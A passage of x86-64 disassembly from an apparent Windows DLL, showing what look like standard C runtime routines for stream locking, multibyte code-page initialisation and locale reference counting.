   180004923:	48 83 c2 30          	add    $0x30,%rdx
   180004927:	49 ff c9             	dec    %r9
   18000492a:	75 bd                	jne    0x1800048e9
   18000492c:	33 c0                	xor    %eax,%eax
   18000492e:	48 83 c4 20          	add    $0x20,%rsp
   180004932:	5b                   	pop    %rbx
   180004933:	c3                   	ret
   180004934:	48 83 ec 28          	sub    $0x28,%rsp
   180004938:	e8 c3 25 00 00       	call   0x180006f00
   18000493d:	80 3d e4 8a 00 00 00 	cmpb   $0x0,0x8ae4(%rip)        # 0x18000d428
   180004944:	74 05                	je     0x18000494b
   180004946:	e8 55 23 00 00       	call   0x180006ca0
   18000494b:	48 8b 0d 96 9a 00 00 	mov    0x9a96(%rip),%rcx        # 0x18000e3e8
   180004952:	48 83 c4 28          	add    $0x28,%rsp
   180004956:	e9 5d e3 ff ff       	jmp    0x180002cb8
   18000495b:	cc                   	int3
   18000495c:	40 53                	rex push %rbx
   18000495e:	48 83 ec 20          	sub    $0x20,%rsp
   180004962:	48 8b d9             	mov    %rcx,%rbx
   180004965:	48 8d 0d 84 78 00 00 	lea    0x7884(%rip),%rcx        # 0x18000c1f0
   18000496c:	48 3b d9             	cmp    %rcx,%rbx
   18000496f:	72 3e                	jb     0x1800049af
   180004971:	48 8d 05 08 7c 00 00 	lea    0x7c08(%rip),%rax        # 0x18000c580
   180004978:	48 3b d8             	cmp    %rax,%rbx
   18000497b:	77 32                	ja     0x1800049af
   18000497d:	48 8b d3             	mov    %rbx,%rdx
   180004980:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   180004987:	aa aa 2a 
   18000498a:	48 2b d1             	sub    %rcx,%rdx
   18000498d:	48 f7 ea             	imul   %rdx
   180004990:	48 c1 fa 03          	sar    $0x3,%rdx
   180004994:	48 8b ca             	mov    %rdx,%rcx
   180004997:	48 c1 e9 3f          	shr    $0x3f,%rcx
   18000499b:	8d 4c 11 10          	lea    0x10(%rcx,%rdx,1),%ecx
   18000499f:	e8 3c 14 00 00       	call   0x180005de0
   1800049a4:	0f ba 6b 18 0f       	btsl   $0xf,0x18(%rbx)
   1800049a9:	48 83 c4 20          	add    $0x20,%rsp
   1800049ad:	5b                   	pop    %rbx
   1800049ae:	c3                   	ret
   1800049af:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
   1800049b3:	48 83 c4 20          	add    $0x20,%rsp
   1800049b7:	5b                   	pop    %rbx
   1800049b8:	48 ff 25 e9 47 00 00 	rex.W jmp *0x47e9(%rip)        # 0x1800091a8
   1800049bf:	cc                   	int3
   1800049c0:	40 53                	rex push %rbx
   1800049c2:	48 83 ec 20          	sub    $0x20,%rsp
   1800049c6:	48 8b da             	mov    %rdx,%rbx
   1800049c9:	83 f9 14             	cmp    $0x14,%ecx
   1800049cc:	7d 13                	jge    0x1800049e1
   1800049ce:	83 c1 10             	add    $0x10,%ecx
   1800049d1:	e8 0a 14 00 00       	call   0x180005de0
   1800049d6:	0f ba 6b 18 0f       	btsl   $0xf,0x18(%rbx)
   1800049db:	48 83 c4 20          	add    $0x20,%rsp
   1800049df:	5b                   	pop    %rbx
   1800049e0:	c3                   	ret
   1800049e1:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
   1800049e5:	48 83 c4 20          	add    $0x20,%rsp
   1800049e9:	5b                   	pop    %rbx
   1800049ea:	48 ff 25 b7 47 00 00 	rex.W jmp *0x47b7(%rip)        # 0x1800091a8
   1800049f1:	cc                   	int3
   1800049f2:	cc                   	int3
   1800049f3:	cc                   	int3
   1800049f4:	48 8d 15 f5 77 00 00 	lea    0x77f5(%rip),%rdx        # 0x18000c1f0
   1800049fb:	48 3b ca             	cmp    %rdx,%rcx
   1800049fe:	72 35                	jb     0x180004a35
   180004a00:	48 8d 05 79 7b 00 00 	lea    0x7b79(%rip),%rax        # 0x18000c580
   180004a07:	48 3b c8             	cmp    %rax,%rcx
   180004a0a:	77 29                	ja     0x180004a35
   180004a0c:	0f ba 71 18 0f       	btrl   $0xf,0x18(%rcx)
   180004a11:	48 2b ca             	sub    %rdx,%rcx
   180004a14:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   180004a1b:	aa aa 2a 
   180004a1e:	48 f7 e9             	imul   %rcx
   180004a21:	48 c1 fa 03          	sar    $0x3,%rdx
   180004a25:	48 8b ca             	mov    %rdx,%rcx
   180004a28:	48 c1 e9 3f          	shr    $0x3f,%rcx
   180004a2c:	8d 4c 11 10          	lea    0x10(%rcx,%rdx,1),%ecx
   180004a30:	e9 ab 12 00 00       	jmp    0x180005ce0
   180004a35:	48 83 c1 30          	add    $0x30,%rcx
   180004a39:	48 ff 25 70 47 00 00 	rex.W jmp *0x4770(%rip)        # 0x1800091b0
   180004a40:	83 f9 14             	cmp    $0x14,%ecx
   180004a43:	7d 0d                	jge    0x180004a52
   180004a45:	0f ba 72 18 0f       	btrl   $0xf,0x18(%rdx)
   180004a4a:	83 c1 10             	add    $0x10,%ecx
   180004a4d:	e9 8e 12 00 00       	jmp    0x180005ce0
   180004a52:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
   180004a56:	48 ff 25 53 47 00 00 	rex.W jmp *0x4753(%rip)        # 0x1800091b0
   180004a5d:	cc                   	int3
   180004a5e:	cc                   	int3
   180004a5f:	cc                   	int3
   180004a60:	48 83 ec 28          	sub    $0x28,%rsp
   180004a64:	48 85 c9             	test   %rcx,%rcx
   180004a67:	75 15                	jne    0x180004a7e
   180004a69:	e8 32 dc ff ff       	call   0x1800026a0
   180004a6e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180004a74:	e8 bf db ff ff       	call   0x180002638
   180004a79:	83 c8 ff             	or     $0xffffffff,%eax
   180004a7c:	eb 03                	jmp    0x180004a81
   180004a7e:	8b 41 1c             	mov    0x1c(%rcx),%eax
   180004a81:	48 83 c4 28          	add    $0x28,%rsp
   180004a85:	c3                   	ret
   180004a86:	cc                   	int3
   180004a87:	cc                   	int3
   180004a88:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004a8d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180004a92:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180004a97:	57                   	push   %rdi
   180004a98:	48 83 ec 20          	sub    $0x20,%rsp
   180004a9c:	48 8d 59 1c          	lea    0x1c(%rcx),%rbx
   180004aa0:	48 8b e9             	mov    %rcx,%rbp
   180004aa3:	be 01 01 00 00       	mov    $0x101,%esi
   180004aa8:	48 8b cb             	mov    %rbx,%rcx
   180004aab:	44 8b c6             	mov    %esi,%r8d
   180004aae:	33 d2                	xor    %edx,%edx
   180004ab0:	e8 3b c7 ff ff       	call   0x1800011f0
   180004ab5:	45 33 db             	xor    %r11d,%r11d
   180004ab8:	48 8d 7d 10          	lea    0x10(%rbp),%rdi
   180004abc:	41 8d 4b 06          	lea    0x6(%r11),%ecx
   180004ac0:	41 0f b7 c3          	movzwl %r11w,%eax
   180004ac4:	44 89 5d 0c          	mov    %r11d,0xc(%rbp)
   180004ac8:	4c 89 5d 04          	mov    %r11,0x4(%rbp)
   180004acc:	66 f3 ab             	rep stos %ax,(%rdi)
   180004acf:	48 8d 3d da 7a 00 00 	lea    0x7ada(%rip),%rdi        # 0x18000c5b0
   180004ad6:	48 2b fd             	sub    %rbp,%rdi
   180004ad9:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   180004adc:	88 03                	mov    %al,(%rbx)
   180004ade:	48 ff c3             	inc    %rbx
   180004ae1:	48 ff ce             	dec    %rsi
   180004ae4:	75 f3                	jne    0x180004ad9
   180004ae6:	48 8d 8d 1d 01 00 00 	lea    0x11d(%rbp),%rcx
   180004aed:	ba 00 01 00 00       	mov    $0x100,%edx
   180004af2:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   180004af5:	88 01                	mov    %al,(%rcx)
   180004af7:	48 ff c1             	inc    %rcx
   180004afa:	48 ff ca             	dec    %rdx
   180004afd:	75 f3                	jne    0x180004af2
   180004aff:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004b04:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180004b09:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180004b0e:	48 83 c4 20          	add    $0x20,%rsp
   180004b12:	5f                   	pop    %rdi
   180004b13:	c3                   	ret
   180004b14:	48 8b c4             	mov    %rsp,%rax
   180004b17:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180004b1b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180004b1f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180004b23:	55                   	push   %rbp
   180004b24:	48 8d a8 78 fb ff ff 	lea    -0x488(%rax),%rbp
   180004b2b:	48 81 ec 80 05 00 00 	sub    $0x580,%rsp
   180004b32:	48 8b 05 37 84 00 00 	mov    0x8437(%rip),%rax        # 0x18000cf70
   180004b39:	48 33 c4             	xor    %rsp,%rax
   180004b3c:	48 89 85 70 04 00 00 	mov    %rax,0x470(%rbp)
   180004b43:	48 8b f1             	mov    %rcx,%rsi
   180004b46:	8b 49 04             	mov    0x4(%rcx),%ecx
   180004b49:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180004b4e:	ff 15 64 46 00 00    	call   *0x4664(%rip)        # 0x1800091b8
   180004b54:	bb 00 01 00 00       	mov    $0x100,%ebx
   180004b59:	85 c0                	test   %eax,%eax
   180004b5b:	0f 84 3c 01 00 00    	je     0x180004c9d
   180004b61:	33 c0                	xor    %eax,%eax
   180004b63:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180004b68:	88 01                	mov    %al,(%rcx)
   180004b6a:	ff c0                	inc    %eax
   180004b6c:	48 ff c1             	inc    %rcx
   180004b6f:	3b c3                	cmp    %ebx,%eax
   180004b71:	72 f5                	jb     0x180004b68
   180004b73:	8a 44 24 56          	mov    0x56(%rsp),%al
   180004b77:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   180004b7c:	48 8d 7c 24 56       	lea    0x56(%rsp),%rdi
   180004b81:	eb 29                	jmp    0x180004bac
   180004b83:	0f b6 57 01          	movzbl 0x1(%rdi),%edx
   180004b87:	44 0f b6 c0          	movzbl %al,%r8d
   180004b8b:	44 3b c2             	cmp    %edx,%r8d
   180004b8e:	77 16                	ja     0x180004ba6
   180004b90:	41 2b d0             	sub    %r8d,%edx
   180004b93:	41 8b c0             	mov    %r8d,%eax
   180004b96:	4a 8d 4c 04 70       	lea    0x70(%rsp,%r8,1),%rcx
   180004b9b:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   180004b9f:	b2 20                	mov    $0x20,%dl
   180004ba1:	e8 4a c6 ff ff       	call   0x1800011f0
   180004ba6:	48 83 c7 02          	add    $0x2,%rdi
   180004baa:	8a 07                	mov    (%rdi),%al
   180004bac:	84 c0                	test   %al,%al
   180004bae:	75 d3                	jne    0x180004b83
   180004bb0:	8b 46 0c             	mov    0xc(%rsi),%eax
   180004bb3:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   180004bb8:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   180004bbd:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004bc1:	8b 46 04             	mov    0x4(%rsi),%eax
   180004bc4:	44 8b cb             	mov    %ebx,%r9d
   180004bc7:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180004bcb:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   180004bd2:	ba 01 00 00 00       	mov    $0x1,%edx
   180004bd7:	33 c9                	xor    %ecx,%ecx
   180004bd9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180004bde:	e8 ed 27 00 00       	call   0x1800073d0
   180004be3:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   180004be8:	8b 46 04             	mov    0x4(%rsi),%eax
   180004beb:	8b 56 0c             	mov    0xc(%rsi),%edx
   180004bee:	89 44 24 38          	mov    %eax,0x38(%rsp)
   180004bf2:	48 8d 45 70          	lea    0x70(%rbp),%rax
   180004bf6:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180004bfa:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004bff:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   180004c04:	44 8b c3             	mov    %ebx,%r8d
   180004c07:	33 c9                	xor    %ecx,%ecx
   180004c09:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180004c0d:	e8 c6 25 00 00       	call   0x1800071d8
   180004c12:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   180004c17:	8b 46 04             	mov    0x4(%rsi),%eax
   180004c1a:	8b 56 0c             	mov    0xc(%rsi),%edx
   180004c1d:	89 44 24 38          	mov    %eax,0x38(%rsp)
   180004c21:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   180004c28:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180004c2c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004c31:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   180004c36:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   180004c3c:	33 c9                	xor    %ecx,%ecx
   180004c3e:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180004c42:	e8 91 25 00 00       	call   0x1800071d8
   180004c47:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   180004c4b:	4c 8d 85 70 01 00 00 	lea    0x170(%rbp),%r8
   180004c52:	48 2b d6             	sub    %rsi,%rdx
   180004c55:	4c 8d 9d 70 02 00 00 	lea    0x270(%rbp),%r11
   180004c5c:	48 8d 4e 1d          	lea    0x1d(%rsi),%rcx
   180004c60:	4c 2b c6             	sub    %rsi,%r8
   180004c63:	41 f6 03 01          	testb  $0x1,(%r11)
   180004c67:	74 09                	je     0x180004c72
   180004c69:	80 09 10             	orb    $0x10,(%rcx)
   180004c6c:	8a 44 0a e3          	mov    -0x1d(%rdx,%rcx,1),%al
   180004c70:	eb 0e                	jmp    0x180004c80
   180004c72:	41 f6 03 02          	testb  $0x2,(%r11)
   180004c76:	74 10                	je     0x180004c88
   180004c78:	80 09 20             	orb    $0x20,(%rcx)
   180004c7b:	41 8a 44 08 e3       	mov    -0x1d(%r8,%rcx,1),%al
   180004c80:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   180004c86:	eb 07                	jmp    0x180004c8f
   180004c88:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   180004c8f:	48 ff c1             	inc    %rcx
   180004c92:	49 83 c3 02          	add    $0x2,%r11
   180004c96:	48 ff cb             	dec    %rbx
   180004c99:	75 c8                	jne    0x180004c63
   180004c9b:	eb 3f                	jmp    0x180004cdc
   180004c9d:	33 d2                	xor    %edx,%edx
   180004c9f:	48 8d 4e 1d          	lea    0x1d(%rsi),%rcx
   180004ca3:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   180004ca7:	41 8d 40 20          	lea    0x20(%r8),%eax
   180004cab:	83 f8 19             	cmp    $0x19,%eax
   180004cae:	77 08                	ja     0x180004cb8
   180004cb0:	80 09 10             	orb    $0x10,(%rcx)
   180004cb3:	8d 42 20             	lea    0x20(%rdx),%eax
   180004cb6:	eb 0c                	jmp    0x180004cc4
   180004cb8:	41 83 f8 19          	cmp    $0x19,%r8d
   180004cbc:	77 0e                	ja     0x180004ccc
   180004cbe:	80 09 20             	orb    $0x20,(%rcx)
   180004cc1:	8d 42 e0             	lea    -0x20(%rdx),%eax
   180004cc4:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   180004cca:	eb 07                	jmp    0x180004cd3
   180004ccc:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   180004cd3:	ff c2                	inc    %edx
   180004cd5:	48 ff c1             	inc    %rcx
   180004cd8:	3b d3                	cmp    %ebx,%edx
   180004cda:	72 c7                	jb     0x180004ca3
   180004cdc:	48 8b 8d 70 04 00 00 	mov    0x470(%rbp),%rcx
   180004ce3:	48 33 cc             	xor    %rsp,%rcx
   180004ce6:	e8 75 0d 00 00       	call   0x180005a60
   180004ceb:	4c 8d 9c 24 80 05 00 	lea    0x580(%rsp),%r11
   180004cf2:	00 
   180004cf3:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180004cf7:	49 8b 73 20          	mov    0x20(%r11),%rsi
   180004cfb:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   180004cff:	49 8b e3             	mov    %r11,%rsp
   180004d02:	5d                   	pop    %rbp
   180004d03:	c3                   	ret
   180004d04:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180004d09:	57                   	push   %rdi
   180004d0a:	48 83 ec 20          	sub    $0x20,%rsp
   180004d0e:	e8 89 dd ff ff       	call   0x180002a9c
   180004d13:	48 8b f8             	mov    %rax,%rdi
   180004d16:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   180004d1c:	85 0d be 7d 00 00    	test   %ecx,0x7dbe(%rip)        # 0x18000cae0
   180004d22:	74 13                	je     0x180004d37
   180004d24:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   180004d2b:	00 
   180004d2c:	74 09                	je     0x180004d37
   180004d2e:	48 8b 98 b8 00 00 00 	mov    0xb8(%rax),%rbx
   180004d35:	eb 6c                	jmp    0x180004da3
   180004d37:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180004d3c:	e8 9f 10 00 00       	call   0x180005de0
   180004d41:	90                   	nop
   180004d42:	48 8b 9f b8 00 00 00 	mov    0xb8(%rdi),%rbx
   180004d49:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180004d4e:	48 3b 1d 8b 7c 00 00 	cmp    0x7c8b(%rip),%rbx        # 0x18000c9e0
   180004d55:	74 42                	je     0x180004d99
   180004d57:	48 85 db             	test   %rbx,%rbx
   180004d5a:	74 1b                	je     0x180004d77
   180004d5c:	f0 ff 0b             	lock decl (%rbx)
   180004d5f:	75 16                	jne    0x180004d77
   180004d61:	48 8d 05 48 78 00 00 	lea    0x7848(%rip),%rax        # 0x18000c5b0
   180004d68:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180004d6d:	48 3b c8             	cmp    %rax,%rcx
   180004d70:	74 05                	je     0x180004d77
   180004d72:	e8 41 df ff ff       	call   0x180002cb8
   180004d77:	48 8b 05 62 7c 00 00 	mov    0x7c62(%rip),%rax        # 0x18000c9e0
   180004d7e:	48 89 87 b8 00 00 00 	mov    %rax,0xb8(%rdi)
   180004d85:	48 8b 05 54 7c 00 00 	mov    0x7c54(%rip),%rax        # 0x18000c9e0
   180004d8c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004d91:	f0 ff 00             	lock incl (%rax)
   180004d94:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004d99:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180004d9e:	e8 3d 0f 00 00       	call   0x180005ce0
   180004da3:	48 85 db             	test   %rbx,%rbx
   180004da6:	75 08                	jne    0x180004db0
   180004da8:	8d 4b 20             	lea    0x20(%rbx),%ecx
   180004dab:	e8 50 e4 ff ff       	call   0x180003200
   180004db0:	48 8b c3             	mov    %rbx,%rax
   180004db3:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180004db8:	48 83 c4 20          	add    $0x20,%rsp
   180004dbc:	5f                   	pop    %rdi
   180004dbd:	c3                   	ret
   180004dbe:	cc                   	int3
   180004dbf:	cc                   	int3
   180004dc0:	40 53                	rex push %rbx
   180004dc2:	48 83 ec 40          	sub    $0x40,%rsp
   180004dc6:	8b d9                	mov    %ecx,%ebx
   180004dc8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180004dcd:	33 d2                	xor    %edx,%edx
   180004dcf:	e8 e8 c9 ff ff       	call   0x1800017bc
   180004dd4:	83 25 7d 87 00 00 00 	andl   $0x0,0x877d(%rip)        # 0x18000d558
   180004ddb:	83 fb fe             	cmp    $0xfffffffe,%ebx
   180004dde:	75 25                	jne    0x180004e05
   180004de0:	c7 05 6e 87 00 00 01 	movl   $0x1,0x876e(%rip)        # 0x18000d558
   180004de7:	00 00 00 
   180004dea:	ff 15 d8 43 00 00    	call   *0x43d8(%rip)        # 0x1800091c8
   180004df0:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180004df5:	74 53                	je     0x180004e4a
   180004df7:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180004dfc:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180004e03:	eb 45                	jmp    0x180004e4a
   180004e05:	83 fb fd             	cmp    $0xfffffffd,%ebx
   180004e08:	75 12                	jne    0x180004e1c
   180004e0a:	c7 05 44 87 00 00 01 	movl   $0x1,0x8744(%rip)        # 0x18000d558
   180004e11:	00 00 00 
   180004e14:	ff 15 a6 43 00 00    	call   *0x43a6(%rip)        # 0x1800091c0
   180004e1a:	eb d4                	jmp    0x180004df0
   180004e1c:	83 fb fc             	cmp    $0xfffffffc,%ebx
   180004e1f:	75 14                	jne    0x180004e35
   180004e21:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180004e26:	c7 05 28 87 00 00 01 	movl   $0x1,0x8728(%rip)        # 0x18000d558
   180004e2d:	00 00 00 
   180004e30:	8b 40 04             	mov    0x4(%rax),%eax
   180004e33:	eb bb                	jmp    0x180004df0
   180004e35:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180004e3a:	74 0c                	je     0x180004e48
   180004e3c:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180004e41:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   180004e48:	8b c3                	mov    %ebx,%eax
   180004e4a:	48 83 c4 40          	add    $0x40,%rsp
   180004e4e:	5b                   	pop    %rbx
   180004e4f:	c3                   	ret
   180004e50:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180004e55:	55                   	push   %rbp
   180004e56:	56                   	push   %rsi
   180004e57:	57                   	push   %rdi
   180004e58:	41 54                	push   %r12
   180004e5a:	41 55                	push   %r13
   180004e5c:	48 83 ec 40          	sub    $0x40,%rsp
   180004e60:	48 8b 05 09 81 00 00 	mov    0x8109(%rip),%rax        # 0x18000cf70
   180004e67:	48 33 c4             	xor    %rsp,%rax
   180004e6a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004e6f:	48 8b f2             	mov    %rdx,%rsi
   180004e72:	e8 49 ff ff ff       	call   0x180004dc0
   180004e77:	33 db                	xor    %ebx,%ebx
   180004e79:	8b f8                	mov    %eax,%edi
   180004e7b:	85 c0                	test   %eax,%eax
   180004e7d:	75 0d                	jne    0x180004e8c
   180004e7f:	48 8b ce             	mov    %rsi,%rcx
   180004e82:	e8 01 fc ff ff       	call   0x180004a88
   180004e87:	e9 16 02 00 00       	jmp    0x1800050a2
   180004e8c:	4c 8d 2d 5d 7b 00 00 	lea    0x7b5d(%rip),%r13        # 0x18000c9f0
   180004e93:	8b cb                	mov    %ebx,%ecx
   180004e95:	48 8b eb             	mov    %rbx,%rbp
   180004e98:	49 8b c5             	mov    %r13,%rax
   180004e9b:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   180004ea1:	39 38                	cmp    %edi,(%rax)
   180004ea3:	0f 84 26 01 00 00    	je     0x180004fcf
   180004ea9:	41 03 cc             	add    %r12d,%ecx
   180004eac:	49 03 ec             	add    %r12,%rbp
   180004eaf:	48 83 c0 30          	add    $0x30,%rax
   180004eb3:	83 f9 05             	cmp    $0x5,%ecx
   180004eb6:	72 e9                	jb     0x180004ea1
   180004eb8:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   180004ebe:	0f 84 03 01 00 00    	je     0x180004fc7
   180004ec4:	81 ff e9 fd 00 00    	cmp    $0xfde9,%edi
   180004eca:	0f 84 f7 00 00 00    	je     0x180004fc7
   180004ed0:	0f b7 cf             	movzwl %di,%ecx
   180004ed3:	ff 15 f7 42 00 00    	call   *0x42f7(%rip)        # 0x1800091d0
   180004ed9:	85 c0                	test   %eax,%eax
   180004edb:	0f 84 e6 00 00 00    	je     0x180004fc7
   180004ee1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180004ee6:	8b cf                	mov    %edi,%ecx
   180004ee8:	ff 15 ca 42 00 00    	call   *0x42ca(%rip)        # 0x1800091b8
   180004eee:	85 c0                	test   %eax,%eax
   180004ef0:	0f 84 c5 00 00 00    	je     0x180004fbb
   180004ef6:	48 8d 4e 1c          	lea    0x1c(%rsi),%rcx
   180004efa:	33 d2                	xor    %edx,%edx
   180004efc:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   180004f02:	e8 e9 c2 ff ff       	call   0x1800011f0
   180004f07:	89 7e 04             	mov    %edi,0x4(%rsi)
   180004f0a:	89 5e 0c             	mov    %ebx,0xc(%rsi)
   180004f0d:	44 39 64 24 20       	cmp    %r12d,0x20(%rsp)
   180004f12:	0f 86 8c 00 00 00    	jbe    0x180004fa4
   180004f18:	48 8d 44 24 26       	lea    0x26(%rsp),%rax
   180004f1d:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   180004f21:	74 2d                	je     0x180004f50
   180004f23:	38 58 01             	cmp    %bl,0x1(%rax)
   180004f26:	74 28                	je     0x180004f50
   180004f28:	0f b6 38             	movzbl (%rax),%edi
   180004f2b:	0f b6 48 01          	movzbl 0x1(%rax),%ecx
   180004f2f:	3b f9                	cmp    %ecx,%edi
   180004f31:	77 15                	ja     0x180004f48
   180004f33:	2b cf                	sub    %edi,%ecx
   180004f35:	48 8d 54 37 1d       	lea    0x1d(%rdi,%rsi,1),%rdx
   180004f3a:	41 03 cc             	add    %r12d,%ecx
   180004f3d:	80 0a 04             	orb    $0x4,(%rdx)
   180004f40:	49 03 d4             	add    %r12,%rdx
   180004f43:	49 2b cc             	sub    %r12,%rcx
   180004f46:	75 f5                	jne    0x180004f3d
   180004f48:	48 83 c0 02          	add    $0x2,%rax
   180004f4c:	38 18                	cmp    %bl,(%rax)
   180004f4e:	75 d3                	jne    0x180004f23
   180004f50:	48 8d 46 1e          	lea    0x1e(%rsi),%rax
   180004f54:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   180004f59:	80 08 08             	orb    $0x8,(%rax)
   180004f5c:	49 03 c4             	add    %r12,%rax
   180004f5f:	49 2b cc             	sub    %r12,%rcx
   180004f62:	75 f5                	jne    0x180004f59
   180004f64:	8b 4e 04             	mov    0x4(%rsi),%ecx
   180004f67:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   180004f6d:	74 27                	je     0x180004f96
   180004f6f:	83 e9 04             	sub    $0x4,%ecx
   180004f72:	74 1b                	je     0x180004f8f
   180004f74:	83 e9 0d             	sub    $0xd,%ecx
   180004f77:	74 0f                	je     0x180004f88
   180004f79:	ff c9                	dec    %ecx
   180004f7b:	74 04                	je     0x180004f81
   180004f7d:	8b c3                	mov    %ebx,%eax
   180004f7f:	eb 1a                	jmp    0x180004f9b
   180004f81:	b8 04 04 00 00       	mov    $0x404,%eax
   180004f86:	eb 13                	jmp    0x180004f9b
   180004f88:	b8 12 04 00 00       	mov    $0x412,%eax
   180004f8d:	eb 0c                	jmp    0x180004f9b
   180004f8f:	b8 04 08 00 00       	mov    $0x804,%eax
   180004f94:	eb 05                	jmp    0x180004f9b
   180004f96:	b8 11 04 00 00       	mov    $0x411,%eax
   180004f9b:	89 46 0c             	mov    %eax,0xc(%rsi)
   180004f9e:	44 89 66 08          	mov    %r12d,0x8(%rsi)
   180004fa2:	eb 03                	jmp    0x180004fa7
   180004fa4:	89 5e 08             	mov    %ebx,0x8(%rsi)
   180004fa7:	48 8d 7e 10          	lea    0x10(%rsi),%rdi
   180004fab:	0f b7 c3             	movzwl %bx,%eax
   180004fae:	b9 06 00 00 00       	mov    $0x6,%ecx
   180004fb3:	66 f3 ab             	rep stos %ax,(%rdi)
   180004fb6:	e9 df 00 00 00       	jmp    0x18000509a
   180004fbb:	39 1d 97 85 00 00    	cmp    %ebx,0x8597(%rip)        # 0x18000d558
   180004fc1:	0f 85 b8 fe ff ff    	jne    0x180004e7f
   180004fc7:	83 c8 ff             	or     $0xffffffff,%eax
   180004fca:	e9 d5 00 00 00       	jmp    0x1800050a4
   180004fcf:	48 8d 4e 1c          	lea    0x1c(%rsi),%rcx
   180004fd3:	33 d2                	xor    %edx,%edx
   180004fd5:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   180004fdb:	e8 10 c2 ff ff       	call   0x1800011f0
   180004fe0:	4c 8d 54 6d 00       	lea    0x0(%rbp,%rbp,2),%r10
   180004fe5:	4c 8d 1d fc 79 00 00 	lea    0x79fc(%rip),%r11        # 0x18000c9e8
   180004fec:	49 c1 e2 04          	shl    $0x4,%r10
   180004ff0:	bd 04 00 00 00       	mov    $0x4,%ebp
   180004ff5:	4f 8d 44 2a 10       	lea    0x10(%r10,%r13,1),%r8
   180004ffa:	49 8b c8             	mov    %r8,%rcx
   180004ffd:	41 38 18             	cmp    %bl,(%r8)
   180005000:	74 31                	je     0x180005033
   180005002:	38 59 01             	cmp    %bl,0x1(%rcx)
   180005005:	74 2c                	je     0x180005033
   180005007:	0f b6 11             	movzbl (%rcx),%edx
   18000500a:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   18000500e:	3b d0                	cmp    %eax,%edx
   180005010:	77 19                	ja     0x18000502b
   180005012:	4c 8d 4c 32 1d       	lea    0x1d(%rdx,%rsi,1),%r9
   180005017:	41 8a 03             	mov    (%r11),%al
   18000501a:	41 03 d4             	add    %r12d,%edx
   18000501d:	41 08 01             	or     %al,(%r9)
   180005020:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
